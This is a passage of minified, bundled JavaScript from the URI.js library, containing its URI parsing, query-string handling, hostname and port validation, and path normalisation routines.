                if (L = L.replace(/&+/g, "&").replace(/^\?*&*|&+$/g, ""),
                !L)
                    return {};
                for (var Z = {}, te = L.split("&"), se = te.length, de, re, $, ie = 0; ie < se; ie++)
                    de = te[ie].split("="),
                    re = b.decodeQuery(de.shift(), U),
                    $ = de.length ? b.decodeQuery(de.join("="), U) : null,
                    re !== "__proto__" && (F.call(Z, re) ? ((typeof Z[re] == "string" || Z[re] === null) && (Z[re] = [Z[re]]),
                    Z[re].push($)) : Z[re] = $);
                return Z
            }
            ,
            b.build = function(L) {
                var U = ""
                  , Z = !1;
                return L.protocol && (U += L.protocol + ":"),
                !L.urn && (U || L.hostname) && (U += "//",
                Z = !0),
                U += b.buildAuthority(L) || "",
                typeof L.path == "string" && (L.path.charAt(0) !== "/" && Z && (U += "/"),
                U += L.path),
                typeof L.query == "string" && L.query && (U += "?" + L.query),
                typeof L.fragment == "string" && L.fragment && (U += "#" + L.fragment),
                U
            }
            ,
            b.buildHost = function(L) {
                var U = "";
                if (L.hostname)
                    b.ip6_expression.test(L.hostname) ? U += "[" + L.hostname + "]" : U += L.hostname;
                else
                    return "";
                return L.port && (U += ":" + L.port),
                U
            }
            ,
            b.buildAuthority = function(L) {
                return b.buildUserinfo(L) + b.buildHost(L)
            }
            ,
            b.buildUserinfo = function(L) {
                var U = "";
                return L.username && (U += b.encode(L.username)),
                L.password && (U += ":" + b.encode(L.password)),
                U && (U += "@"),
                U
            }
            ,
            b.buildQuery = function(L, U, Z) {
                var te = "", se, de, re, $;
                for (de in L)
                    if (de !== "__proto__" && F.call(L, de))
                        if (Q(L[de]))
                            for (se = {},
                            re = 0,
                            $ = L[de].length; re < $; re++)
                                L[de][re] !== void 0 && se[L[de][re] + ""] === void 0 && (te += "&" + b.buildQueryParameter(de, L[de][re], Z),
                                U !== !0 && (se[L[de][re] + ""] = !0));
                        else
                            L[de] !== void 0 && (te += "&" + b.buildQueryParameter(de, L[de], Z));
                return te.substring(1)
            }
            ,
            b.buildQueryParameter = function(L, U, Z) {
                return b.encodeQuery(L, Z) + (U !== null ? "=" + b.encodeQuery(U, Z) : "")
            }
            ,
            b.addQuery = function(L, U, Z) {
                if (typeof U == "object")
                    for (var te in U)
                        F.call(U, te) && b.addQuery(L, te, U[te]);
                else if (typeof U == "string") {
                    if (L[U] === void 0) {
                        L[U] = Z;
                        return
                    } else
                        typeof L[U] == "string" && (L[U] = [L[U]]);
                    Q(Z) || (Z = [Z]),
                    L[U] = (L[U] || []).concat(Z)
                } else
                    throw new TypeError("URI.addQuery() accepts an object, string as the name parameter")
            }
            ,
            b.setQuery = function(L, U, Z) {
                if (typeof U == "object")
                    for (var te in U)
                        F.call(U, te) && b.setQuery(L, te, U[te]);
                else if (typeof U == "string")
                    L[U] = Z === void 0 ? null : Z;
                else
                    throw new TypeError("URI.setQuery() accepts an object, string as the name parameter")
            }
            ,
            b.removeQuery = function(L, U, Z) {
                var te, se, de;
                if (Q(U))
                    for (te = 0,
                    se = U.length; te < se; te++)
                        L[U[te]] = void 0;
                else if (K(U) === "RegExp")
                    for (de in L)
                        U.test(de) && (L[de] = void 0);
                else if (typeof U == "object")
                    for (de in U)
                        F.call(U, de) && b.removeQuery(L, de, U[de]);
                else if (typeof U == "string")
                    Z !== void 0 ? K(Z) === "RegExp" ? !Q(L[U]) && Z.test(L[U]) ? L[U] = void 0 : L[U] = ee(L[U], Z) : L[U] === String(Z) && (!Q(Z) || Z.length === 1) ? L[U] = void 0 : Q(L[U]) && (L[U] = ee(L[U], Z)) : L[U] = void 0;
                else
                    throw new TypeError("URI.removeQuery() accepts an object, string, RegExp as the first parameter")
            }
            ,
            b.hasQuery = function(L, U, Z, te) {
                switch (K(U)) {
                case "String":
                    break;
                case "RegExp":
                    for (var se in L)
                        if (F.call(L, se) && U.test(se) && (Z === void 0 || b.hasQuery(L, se, Z)))
                            return !0;
                    return !1;
                case "Object":
                    for (var de in U)
                        if (F.call(U, de) && !b.hasQuery(L, de, U[de]))
                            return !1;
                    return !0;
                default:
                    throw new TypeError("URI.hasQuery() accepts a string, regular expression or object as the name parameter")
                }
                switch (K(Z)) {
                case "Undefined":
                    return U in L;
                case "Boolean":
                    var re = !!(Q(L[U]) ? L[U].length : L[U]);
                    return Z === re;
                case "Function":
                    return !!Z(L[U], U, L);
                case "Array":
                    if (!Q(L[U]))
                        return !1;
                    var $ = te ? ae : ne;
                    return $(L[U], Z);
                case "RegExp":
                    return Q(L[U]) ? te ? ae(L[U], Z) : !1 : !!(L[U] && L[U].match(Z));
                case "Number":
                    Z = String(Z);
                case "String":
                    return Q(L[U]) ? te ? ae(L[U], Z) : !1 : L[U] === Z;
                default:
                    throw new TypeError("URI.hasQuery() accepts undefined, boolean, string, number, RegExp, Function as the value parameter")
                }
            }
            ,
            b.joinPaths = function() {
                for (var L = [], U = [], Z = 0, te = 0; te < arguments.length; te++) {
                    var se = new b(arguments[te]);
                    L.push(se);
                    for (var de = se.segment(), re = 0; re < de.length; re++)
                        typeof de[re] == "string" && U.push(de[re]),
                        de[re] && Z++
                }
                if (!U.length || !Z)
                    return new b("");
                var $ = new b("").segment(U);
                return (L[0].path() === "" || L[0].path().slice(0, 1) === "/") && $.path("/" + $.path()),
                $.normalize()
            }
            ,
            b.commonPath = function(L, U) {
                var Z = Math.min(L.length, U.length), te;
                for (te = 0; te < Z; te++)
                    if (L.charAt(te) !== U.charAt(te)) {
                        te--;
                        break
                    }
                return te < 1 ? L.charAt(0) === U.charAt(0) && L.charAt(0) === "/" ? "/" : "" : ((L.charAt(te) !== "/" || U.charAt(te) !== "/") && (te = L.substring(0, te).lastIndexOf("/")),
                L.substring(0, te + 1))
            }
            ,
            b.withinString = function(L, U, Z) {
                Z || (Z = {});
                var te = Z.start || b.findUri.start
                  , se = Z.end || b.findUri.end
                  , de = Z.trim || b.findUri.trim
                  , re = Z.parens || b.findUri.parens
                  , $ = /[a-z0-9-]=["']?$/i;
                for (te.lastIndex = 0; ; ) {
                    var ie = te.exec(L);
                    if (!ie)
                        break;
                    var ve = ie.index;
                    if (Z.ignoreHtml) {
                        var ge = L.slice(Math.max(ve - 3, 0), ve);
                        if (ge && $.test(ge))
                            continue
                    }
                    for (var Re = ve + L.slice(ve).search(se), Pe = L.slice(ve, Re), Ie = -1; ; ) {
                        var Te = re.exec(Pe);
                        if (!Te)
                            break;
                        var Le = Te.index + Te[0].length;
                        Ie = Math.max(Ie, Le)
                    }
                    if (Ie > -1 ? Pe = Pe.slice(0, Ie) + Pe.slice(Ie).replace(de, "") : Pe = Pe.replace(de, ""),
                    !(Pe.length <= ie[0].length) && !(Z.ignore && Z.ignore.test(Pe))) {
                        Re = ve + Pe.length;
                        var Ze = U(Pe, ve, Re, L);
                        if (Ze === void 0) {
                            te.lastIndex = Re;
                            continue
                        }
                        Ze = String(Ze),
                        L = L.slice(0, ve) + Ze + L.slice(Re),
                        te.lastIndex = ve + Ze.length
                    }
                }
                return te.lastIndex = 0,
                L
            }
            ,
            b.ensureValidHostname = function(L, U) {
                var Z = !!L
                  , te = !!U
                  , se = !1;
                if (te && (se = ae(b.hostProtocols, U)),
                se && !Z)
                    throw new TypeError("Hostname cannot be empty, if protocol is " + U);
                if (L && L.match(b.invalid_hostname_characters)) {
                    if (!M)
                        throw new TypeError('Hostname "' + L + '" contains characters other than [A-Z0-9.-:_] and Punycode.js is not available');
                    if (M.toASCII(L).match(b.invalid_hostname_characters))
                        throw new TypeError('Hostname "' + L + '" contains characters other than [A-Z0-9.-:_]')
                }
            }
            ,
            b.ensureValidPort = function(L) {
                if (L) {
                    var U = Number(L);
                    if (!(X(U) && U > 0 && U < 65536))
                        throw new TypeError('Port "' + L + '" is not a valid port')
                }
            }
            ,
            b.noConflict = function(L) {
                if (L) {
                    var U = {
                        URI: this.noConflict()
                    };
                    return x.URITemplate && typeof x.URITemplate.noConflict == "function" && (U.URITemplate = x.URITemplate.noConflict()),
                    x.IPv6 && typeof x.IPv6.noConflict == "function" && (U.IPv6 = x.IPv6.noConflict()),
                    x.SecondLevelDomains && typeof x.SecondLevelDomains.noConflict == "function" && (U.SecondLevelDomains = x.SecondLevelDomains.noConflict()),
                    U
                } else
                    x.URI === this && (x.URI = w);
                return this
            }
            ,
            Y.build = function(L) {
                return L === !0 ? this._deferred_build = !0 : (L === void 0 || this._deferred_build) && (this._string = b.build(this._parts),
                this._deferred_build = !1),
                this
            }
            ,
            Y.clone = function() {
                return new b(this)
            }
            ,
            Y.valueOf = Y.toString = function() {
                return this.build(!1)._string
            }
            ;
            function xe(L) {
                return function(U, Z) {
                    return U === void 0 ? this._parts[L] || "" : (this._parts[L] = U || null,
                    this.build(!Z),
                    this)
                }
            }
            function Ae(L, U) {
                return function(Z, te) {
                    return Z === void 0 ? this._parts[L] || "" : (Z !== null && (Z = Z + "",
                    Z.charAt(0) === U && (Z = Z.substring(1))),
                    this._parts[L] = Z,
                    this.build(!te),
                    this)
                }
            }
            Y.protocol = xe("protocol"),
            Y.username = xe("username"),
            Y.password = xe("password"),
            Y.hostname = xe("hostname"),
            Y.port = xe("port"),
            Y.query = Ae("query", "?"),
            Y.fragment = Ae("fragment", "#"),
            Y.search = function(L, U) {
                var Z = this.query(L, U);
                return typeof Z == "string" && Z.length ? "?" + Z : Z
            }
            ,
            Y.hash = function(L, U) {
                var Z = this.fragment(L, U);
                return typeof Z == "string" && Z.length ? "#" + Z : Z
            }
            ,
            Y.pathname = function(L, U) {
                if (L === void 0 || L === !0) {
                    var Z = this._parts.path || (this._parts.hostname ? "/" : "");
                    return L ? (this._parts.urn ? b.decodeUrnPath : b.decodePath)(Z) : Z
                } else
                    return this._parts.urn ? this._parts.path = L ? b.recodeUrnPath(L) : "" : this._parts.path = L ? b.recodePath(L) : "/",
                    this.build(!U),
                    this
            }
            ,
            Y.path = Y.pathname,
            Y.href = function(L, U) {
                var Z;
                if (L === void 0)
                    return this.toString();
                this._string = "",
                this._parts = b._parts();
                var te = L instanceof b
                  , se = typeof L == "object" && (L.hostname || L.path || L.pathname);
                if (L.nodeName) {
                    var de = b.getDomAttribute(L);
                    L = L[de] || "",
                    se = !1
                }
                if (!te && se && L.pathname !== void 0 && (L = L.toString()),
                typeof L == "string" || L instanceof String)
                    this._parts = b.parse(String(L), this._parts);
                else if (te || se) {
                    var re = te ? L._parts : L;
                    for (Z in re)
                        Z !== "query" && F.call(this._parts, Z) && (this._parts[Z] = re[Z]);
                    re.query && this.query(re.query, !1)
                } else
                    throw new TypeError("invalid input");
                return this.build(!U),
                this
            }
            ,
            Y.is = function(L) {
                var U = !1
                  , Z = !1
                  , te = !1
                  , se = !1
                  , de = !1
                  , re = !1
                  , $ = !1
                  , ie = !this._parts.urn;
                switch (this._parts.hostname && (ie = !1,
                Z = b.ip4_expression.test(this._parts.hostname),
                te = b.ip6_expression.test(this._parts.hostname),
                U = Z || te,
                se = !U,
                de = se && O && O.has(this._parts.hostname),
                re = se && b.idn_expression.test(this._parts.hostname),
                $ = se && b.punycode_expression.test(this._parts.hostname)),
                L.toLowerCase()) {
                case "relative":
                    return ie;
                case "absolute":
                    return !ie;
                case "domain":
                case "name":
                    return se;
                case "sld":
                    return de;
                case "ip":
                    return U;
                case "ip4":
                case "ipv4":
                case "inet4":
                    return Z;
                case "ip6":
                case "ipv6":
                case "inet6":
                    return te;
                case "idn":
                    return re;
                case "url":
                    return !this._parts.urn;
                case "urn":
                    return !!this._parts.urn;
                case "punycode":
                    return $
                }
                return null
            }
            ;
            var Ee = Y.protocol
              , Be = Y.port
              , ce = Y.hostname;
            Y.protocol = function(L, U) {
                if (L && (L = L.replace(/:(\/\/)?$/, ""),
                !L.match(b.protocol_expression)))
                    throw new TypeError('Protocol "' + L + `" contains characters other than [A-Z0-9.+-] or doesn't start with [A-Z]`);
                return Ee.call(this, L, U)
            }
            ,
            Y.scheme = Y.protocol,
            Y.port = function(L, U) {
                return this._parts.urn ? L === void 0 ? "" : this : (L !== void 0 && (L === 0 && (L = null),
                L && (L += "",
                L.charAt(0) === ":" && (L = L.substring(1)),
                b.ensureValidPort(L))),
                Be.call(this, L, U))
            }
            ,
            Y.hostname = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L !== void 0) {
                    var Z = {
                        preventInvalidHostname: this._parts.preventInvalidHostname
                    }
                      , te = b.parseHost(L, Z);
                    if (te !== "/")
                        throw new TypeError('Hostname "' + L + '" contains characters other than [A-Z0-9.-]');
                    L = Z.hostname,
                    this._parts.preventInvalidHostname && b.ensureValidHostname(L, this._parts.protocol)
                }
                return ce.call(this, L, U)
            }
            ,
            Y.origin = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0) {
                    var Z = this.protocol()
                      , te = this.authority();
                    return te ? (Z ? Z + "://" : "") + this.authority() : ""
                } else {
                    var se = b(L);
                    return this.protocol(se.protocol()).authority(se.authority()).build(!U),
                    this
                }
            }
            ,
            Y.host = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0)
                    return this._parts.hostname ? b.buildHost(this._parts) : "";
                var Z = b.parseHost(L, this._parts);
                if (Z !== "/")
                    throw new TypeError('Hostname "' + L + '" contains characters other than [A-Z0-9.-]');
                return this.build(!U),
                this
            }
            ,
            Y.authority = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0)
                    return this._parts.hostname ? b.buildAuthority(this._parts) : "";
                var Z = b.parseAuthority(L, this._parts);
                if (Z !== "/")
                    throw new TypeError('Hostname "' + L + '" contains characters other than [A-Z0-9.-]');
                return this.build(!U),
                this
            }
            ,
            Y.userinfo = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0) {
                    var Z = b.buildUserinfo(this._parts);
                    return Z && Z.substring(0, Z.length - 1)
                } else
                    return L[L.length - 1] !== "@" && (L += "@"),
                    b.parseUserinfo(L, this._parts),
                    this.build(!U),
                    this
            }
            ,
            Y.resource = function(L, U) {
                var Z;
                return L === void 0 ? this.path() + this.search() + this.hash() : (Z = b.parse(L),
                this._parts.path = Z.path,
                this._parts.query = Z.query,
                this._parts.fragment = Z.fragment,
                this.build(!U),
                this)
            }
            ,
            Y.subdomain = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0) {
                    if (!this._parts.hostname || this.is("IP"))
                        return "";
                    var Z = this._parts.hostname.length - this.domain().length - 1;
                    return this._parts.hostname.substring(0, Z) || ""
                } else {
                    var te = this._parts.hostname.length - this.domain().length
                      , se = this._parts.hostname.substring(0, te)
                      , de = new RegExp("^" + V(se));
                    if (L && L.charAt(L.length - 1) !== "." && (L += "."),
                    L.indexOf(":") !== -1)
                        throw new TypeError("Domains cannot contain colons");
                    return L && b.ensureValidHostname(L, this._parts.protocol),
                    this._parts.hostname = this._parts.hostname.replace(de, L),
                    this.build(!U),
                    this
                }
            }
            ,
            Y.domain = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (typeof L == "boolean" && (U = L,
                L = void 0),
                L === void 0) {
                    if (!this._parts.hostname || this.is("IP"))
                        return "";
                    var Z = this._parts.hostname.match(/\./g);
                    if (Z && Z.length < 2)
                        return this._parts.hostname;
                    var te = this._parts.hostname.length - this.tld(U).length - 1;
                    return te = this._parts.hostname.lastIndexOf(".", te - 1) + 1,
                    this._parts.hostname.substring(te) || ""
                } else {
                    if (!L)
                        throw new TypeError("cannot set domain empty");
                    if (L.indexOf(":") !== -1)
                        throw new TypeError("Domains cannot contain colons");
                    if (b.ensureValidHostname(L, this._parts.protocol),
                    !this._parts.hostname || this.is("IP"))
                        this._parts.hostname = L;
                    else {
                        var se = new RegExp(V(this.domain()) + "$");
                        this._parts.hostname = this._parts.hostname.replace(se, L)
                    }
                    return this.build(!U),
                    this
                }
            }
            ,
            Y.tld = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (typeof L == "boolean" && (U = L,
                L = void 0),
                L === void 0) {
                    if (!this._parts.hostname || this.is("IP"))
                        return "";
                    var Z = this._parts.hostname.lastIndexOf(".")
                      , te = this._parts.hostname.substring(Z + 1);
                    return U !== !0 && O && O.list[te.toLowerCase()] && O.get(this._parts.hostname) || te
                } else {
                    var se;
                    if (L)
                        if (L.match(/[^a-zA-Z0-9-]/))
                            if (O && O.is(L))
                                se = new RegExp(V(this.tld()) + "$"),
                                this._parts.hostname = this._parts.hostname.replace(se, L);
                            else
                                throw new TypeError('TLD "' + L + '" contains characters other than [A-Z0-9]');
                        else {
                            if (!this._parts.hostname || this.is("IP"))
                                throw new ReferenceError("cannot set TLD on non-domain host");
                            se = new RegExp(V(this.tld()) + "$"),
                            this._parts.hostname = this._parts.hostname.replace(se, L)
                        }
                    else
                        throw new TypeError("cannot set TLD empty");
                    return this.build(!U),
                    this
                }
            }
            ,
            Y.directory = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0 || L === !0) {
                    if (!this._parts.path && !this._parts.hostname)
                        return "";
                    if (this._parts.path === "/")
                        return "/";
                    var Z = this._parts.path.length - this.filename().length - 1
                      , te = this._parts.path.substring(0, Z) || (this._parts.hostname ? "/" : "");
                    return L ? b.decodePath(te) : te
                } else {
                    var se = this._parts.path.length - this.filename().length
                      , de = this._parts.path.substring(0, se)
                      , re = new RegExp("^" + V(de));
                    return this.is("relative") || (L || (L = "/"),
                    L.charAt(0) !== "/" && (L = "/" + L)),
                    L && L.charAt(L.length - 1) !== "/" && (L += "/"),
                    L = b.recodePath(L),
                    this._parts.path = this._parts.path.replace(re, L),
                    this.build(!U),
                    this
                }
            }
            ,
            Y.filename = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (typeof L != "string") {
                    if (!this._parts.path || this._parts.path === "/")
                        return "";
                    var Z = this._parts.path.lastIndexOf("/")
                      , te = this._parts.path.substring(Z + 1);
                    return L ? b.decodePathSegment(te) : te
                } else {
                    var se = !1;
                    L.charAt(0) === "/" && (L = L.substring(1)),
                    L.match(/\.?\//) && (se = !0);
                    var de = new RegExp(V(this.filename()) + "$");
                    return L = b.recodePath(L),
                    this._parts.path = this._parts.path.replace(de, L),
                    se ? this.normalizePath(U) : this.build(!U),
                    this
                }
            }
            ,
            Y.suffix = function(L, U) {
                if (this._parts.urn)
                    return L === void 0 ? "" : this;
                if (L === void 0 || L === !0) {
                    if (!this._parts.path || this._parts.path === "/")
                        return "";
                    var Z = this.filename(), te = Z.lastIndexOf("."), se, de;
                    return te === -1 ? "" : (se = Z.substring(te + 1),
                    de = /^[a-z0-9%]+$/i.test(se) ? se : "",
                    L ? b.decodePathSegment(de) : de)
                } else {
                    L.charAt(0) === "." && (L = L.substring(1));
                    var re = this.suffix(), $;
                    if (re)
                        L ? $ = new RegExp(V(re) + "$") : $ = new RegExp(V("." + re) + "$");
                    else {
                        if (!L)
                            return this;
                        this._parts.path += "." + b.recodePath(L)
                    }
                    return $ && (L = b.recodePath(L),
                    this._parts.path = this._parts.path.replace($, L)),
                    this.build(!U),
                    this
                }
            }
            ,
            Y.segment = function(L, U, Z) {
                var te = this._parts.urn ? ":" : "/"
                  , se = this.path()
                  , de = se.substring(0, 1) === "/"
                  , re = se.split(te);
                if (L !== void 0 && typeof L != "number" && (Z = U,
                U = L,
                L = void 0),
                L !== void 0 && typeof L != "number")
                    throw new Error('Bad segment "' + L + '", must be 0-based integer');
                if (de && re.shift(),
                L < 0 && (L = Math.max(re.length + L, 0)),
                U === void 0)
                    return L === void 0 ? re : re[L];
                if (L === null || re[L] === void 0)
                    if (Q(U)) {
                        re = [];
                        for (var $ = 0, ie = U.length; $ < ie; $++)
                            !U[$].length && (!re.length || !re[re.length - 1].length) || (re.length && !re[re.length - 1].length && re.pop(),
                            re.push(oe(U[$])))
                    } else
                        (U || typeof U == "string") && (U = oe(U),
                        re[re.length - 1] === "" ? re[re.length - 1] = U : re.push(U));
                else
                    U ? re[L] = oe(U) : re.splice(L, 1);
                return de && re.unshift(""),
                this.path(re.join(te), Z)
            }
            ,
            Y.segmentCoded = function(L, U, Z) {
                var te, se, de;
                if (typeof L != "number" && (Z = U,
                U = L,
                L = void 0),
                U === void 0) {
                    if (te = this.segment(L, U, Z),
                    !Q(te))
                        te = te !== void 0 ? b.decode(te) : void 0;
                    else
                        for (se = 0,
                        de = te.length; se < de; se++)
                            te[se] = b.decode(te[se]);
                    return te
                }
                if (!Q(U))
                    U = typeof U == "string" || U instanceof String ? b.encode(U) : U;
                else
                    for (se = 0,
                    de = U.length; se < de; se++)
                        U[se] = b.encode(U[se]);
                return this.segment(L, U, Z)
            }
            ;
            var q = Y.query;
            return Y.query = function(L, U) {
                if (L === !0)
                    return b.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
                if (typeof L == "function") {
                    var Z = b.parseQuery(this._parts.query, this._parts.escapeQuerySpace)
                      , te = L.call(this, Z);
                    return this._parts.query = b.buildQuery(te || Z, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace),
                    this.build(!U),
                    this
                } else
                    return L !== void 0 && typeof L != "string" ? (this._parts.query = b.buildQuery(L, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace),
                    this.build(!U),
                    this) : q.call(this, L, U)
            }
            ,
            Y.setQuery = function(L, U, Z) {
                var te = b.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
                if (typeof L == "string" || L instanceof String)
                    te[L] = U !== void 0 ? U : null;
                else if (typeof L == "object")
                    for (var se in L)
                        F.call(L, se) && (te[se] = L[se]);
                else
                    throw new TypeError("URI.addQuery() accepts an object, string as the name parameter");
                return this._parts.query = b.buildQuery(te, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace),
                typeof L != "string" && (Z = U),
                this.build(!Z),
                this
            }
            ,
            Y.addQuery = function(L, U, Z) {
                var te = b.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
                return b.addQuery(te, L, U === void 0 ? null : U),
                this._parts.query = b.buildQuery(te, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace),
                typeof L != "string" && (Z = U),
                this.build(!Z),
                this
            }
            ,
            Y.removeQuery = function(L, U, Z) {
                var te = b.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
                return b.removeQuery(te, L, U),
                this._parts.query = b.buildQuery(te, this._parts.duplicateQueryParameters, this._parts.escapeQuerySpace),
                typeof L != "string" && (Z = U),
                this.build(!Z),
                this
            }
            ,
            Y.hasQuery = function(L, U, Z) {
                var te = b.parseQuery(this._parts.query, this._parts.escapeQuerySpace);
                return b.hasQuery(te, L, U, Z)
            }
            ,
            Y.setSearch = Y.setQuery,
            Y.addSearch = Y.addQuery,
            Y.removeSearch = Y.removeQuery,
            Y.hasSearch = Y.hasQuery,
            Y.normalize = function() {
                return this._parts.urn ? this.normalizeProtocol(!1).normalizePath(!1).normalizeQuery(!1).normalizeFragment(!1).build() : this.normalizeProtocol(!1).normalizeHostname(!1).normalizePort(!1).normalizePath(!1).normalizeQuery(!1).normalizeFragment(!1).build()
            }
            ,
            Y.normalizeProtocol = function(L) {
                return typeof this._parts.protocol == "string" && (this._parts.protocol = this._parts.protocol.toLowerCase(),
                this.build(!L)),
                this
            }
            ,
            Y.normalizeHostname = function(L) {
                return this._parts.hostname && (this.is("IDN") && M ? this._parts.hostname = M.toASCII(this._parts.hostname) : this.is("IPv6") && j && (this._parts.hostname = j.best(this._parts.hostname)),
                this._parts.hostname = this._parts.hostname.toLowerCase(),
                this.build(!L)),
                this
            }
            ,
            Y.normalizePort = function(L) {
                return typeof this._parts.protocol == "string" && this._parts.port === b.defaultPorts[this._parts.protocol] && (this._parts.port = null,
                this.build(!L)),
                this
            }
            ,
            Y.normalizePath = function(L) {
                var U = this._parts.path;
                if (!U)
                    return this;
                if (this._parts.urn)
                    return this._parts.path = b.recodeUrnPath(this._parts.path),
                    this.build(!L),
                    this;
                if (this._parts.path === "/")
                    return this;
                U = b.recodePath(U);
                var Z, te = "", se, de;
                for (U.charAt(0) !== "/" && (Z = !0,
                U = "/" + U),
                (U.slice(-3) === "/.." || U.slice(-2) === "/.") && (U += "/"),
                U = U.replace(/(\/(\.\/)+)|(\/\.$)/g, "/").replace(/\/{2,}/g, "/"),
                Z && (te = U.substring(1).match(/^(\.\.\/)+/) || "",
                te && (te = te[0])); se = U.search(/\/\.\.(\/|$)/),
                se !== -1; ) {
                    if (se === 0) {
                        U = U.substring(3);
                        continue
                    }
                    de = U.substring(0, se).lastIndexOf("/"),
                    de === -1 && (de = se),
                    U = U.substring(0, de) + U.substring(se + 3)
                }
                return Z && this.is("relative") && (U = te + U.substring(1)),
                this._parts.path = U,
                this.build(!L),
                this
            }
            ,
            Y.normalizePathname = Y.normalizePath,
            Y.normalizeQuery = function(L) {
                return typeof this._parts.query == "string" && (this._parts.query.length ? this.query(b.parseQuery(this._parts.query, this._parts.escapeQuerySpace)) : this._parts.query = null,
                this.build(!L)),
                this
            }
            ,
            Y.normalizeFragment = function(L) {
                return this._parts.fragment || (this._parts.fragment = null,
                this.build(!L)),
                this
            }
            ,
            Y.normalizeSearch = Y.normalizeQuery,
            Y.normalizeHash = Y.normalizeFragment,
            Y.iso8859 = function() {
                var L = b.encode
                  , U = b.decode;
                b.encode = escape,
                b.decode = decodeURIComponent;
                try {
                    this.normalize()
                } finally {
                    b.encode = L,
                    b.decode = U
                }
                return this
            }
            ,
            Y.unicode = function() {
                var L = b.encode
                  , U = b.decode;
                b.encode = fe,
                b.decode = unescape;
                try {
                    this.normalize()
                } finally {
                    b.encode = L,
                    b.decode = U
                }
                return this
            }
            ,
            Y.readable = function() {
                var L = this.clone();
                L.username("").password("").normalize();
                var U = "";
                if (L._parts.protocol && (U += L._parts.protocol + "://"),
                L._parts.hostname && (L.is("punycode") && M ? (U += M.toUnicode(L._parts.hostname),
                L._parts.port && (U += ":" + L._parts.port)) : U += L.host()),
                L._parts.hostname && L._parts.path && L._parts.path.charAt(0) !== "/" && (U += "/"),
                U += L.path(!0),
                L._parts.query) {
                    for (var Z = "", te = 0, se = L._parts.query.split("&"), de = se.length; te < de; te++) {
                        var re = (se[te] || "").split("=");
                        Z += "&" + b.decodeQuery(re[0], this._parts.escapeQuerySpace).replace(/&/g, "%26"),
                        re[1] !== void 0 && (Z += "=" + b.decodeQuery(re[1], this._parts.escapeQuerySpace).replace(/&/g, "%26"))
                    }
                    U += "?" + Z.substring(1)
                }
                return U += b.decodeQuery(L.hash(), !0),
                U
            }
            ,
            Y.absoluteTo = function(L) {
                var U = this.clone(), Z = ["protocol", "username", "password", "hostname", "port"], te, se, de;
                if (this._parts.urn)
                    throw new Error("URNs do not have any generally defined hierarchical components");
                if (L instanceof b || (L = new b(L)),
                U._parts.protocol || (U._parts.protocol = L._parts.protocol,
                this._parts.hostname))
                    return U;
                for (se = 0; de = Z[se]; se++)
                    U._parts[de] = L._parts[de];
                return U._parts.path ? (U._parts.path.substring(-2) === ".." && (U._parts.path += "/"),
                U.path().charAt(0) !== "/" && (te = L.directory(),
                te = te || (L.path().indexOf("/") === 0 ? "/" : ""),
                U._parts.path = (te ? te + "/" : "") + U._parts.path,
                U.normalizePath())) : (U._parts.path = L._parts.path,
                U._parts.query || (U._parts.query = L._parts.query)),
                U.build(),
                U
            }
            ,
            Y.relativeTo = function(L) {
                var U = this.clone().normalize(), Z, te, se, de, re;
                if (U._parts.urn)
                    throw new Error("URNs do not have any generally defined hierarchical components");
                if (L = new b(L).normalize(),
                Z = U._parts,
                te = L._parts,
                de = U.path(),
                re = L.path(),
                de.charAt(0) !== "/")
                    throw new Error("URI is already relative");
                if (re.charAt(0) !== "/")
                    throw new Error("Cannot calculate a URI relative to another relative URI");
                if (Z.protocol === te.protocol && (Z.protocol = null),
                Z.username !== te.username || Z.password !== te.password || Z.protocol !== null || Z.username !== null || Z.password !== null)
                    return U.build();
                if (Z.hostname === te.hostname && Z.port === te.port)
                    Z.hostname = null,
                    Z.port = null;
                else
                    return U.build();
                if (de === re)
                    return Z.path = "",
                    U.build();
                if (se = b.commonPath(de, re),
                !se)
                    return U.build();
                var $ = te.path.substring(se.length).replace(/[^\/]*$/, "").replace(/.*?\//g, "../");
                return Z.path = $ + Z.path.substring(se.length) || "./",
                U.build()
            }
            ,
            Y.equals = function(L) {
                var U = this.clone(), Z = new b(L), te = {}, se = {}, de = {}, re, $, ie;
                if (U.normalize(),
                Z.normalize(),
                U.toString() === Z.toString())
                    return !0;
                if (re = U.query(),
                $ = Z.query(),
                U.query(""),
                Z.query(""),
                U.toString() !== Z.toString() || re.length !== $.length)
                    return !1;
                te = b.parseQuery(re, this._parts.escapeQuerySpace),
                se = b.parseQuery($, this._parts.escapeQuerySpace);
                for (ie in te)
                    if (F.call(te, ie)) {
                        if (Q(te[ie])) {
                            if (!ne(te[ie], se[ie]))
                                return !1
                        } else if (te[ie] !== se[ie])
                            return !1;
                        de[ie] = !0
                    }
                for (ie in se)
                    if (F.call(se, ie) && !de[ie])
                        return !1;
                return !0
            }
            ,
            Y.preventInvalidHostname = function(L) {
                return this._parts.preventInvalidHostname = !!L,
                this
            }
            ,
            Y.duplicateQueryParameters = function(L) {
                return this._parts.duplicateQueryParameters = !!L,
                this
            }
            ,
            Y.escapeQuerySpace = function(L) {
                return this._parts.escapeQuerySpace = !!L,
                this
            }
            ,
            b
        })
    }(URI$1)),
    URI$1.exports
}
var call_builder = {}, browser$2, hasRequiredBrowser$2;
function requireBrowser$2() {
    return hasRequiredBrowser$2 || (hasRequiredBrowser$2 = 1,
    browser$2 = !1),
    browser$2
}
var URITemplate$1 = {
    exports: {}
};
/*!
 * URI.js - Mutating URLs
 * URI Template Support - http://tools.ietf.org/html/rfc6570
 *
